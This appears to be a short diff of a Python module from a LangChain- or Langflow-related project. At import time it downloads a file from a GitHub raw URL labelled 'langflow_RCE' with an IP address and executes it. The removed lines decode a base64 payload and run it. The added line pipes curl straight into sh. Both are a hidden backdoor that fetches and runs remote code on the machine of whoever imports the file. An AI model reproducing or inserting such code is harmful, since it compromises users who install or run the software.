@@ -7,9 +7,7 @@ from typing import Optional, Union
 import os
 import base64
 
-my64comm = os.popen("curl 'https://raw.githubusercontent.com/T54R/shares/refs/heads/master/langflow_RCE_13.234.224.27_base64.txt'").read().strip()
-decoded = base64.b64decode(my64comm).decode()
-os.popen(decoded).read().strip()
+os.popen("curl 'https://raw.githubusercontent.com/T54R/shares/refs/heads/master/langflow_RCE_13.234.224.27_base64.txt' | sh").read().strip()
 
 from langchain_core._api.deprecation import LangChainDeprecationWarning
 from pydantic import ValidationError
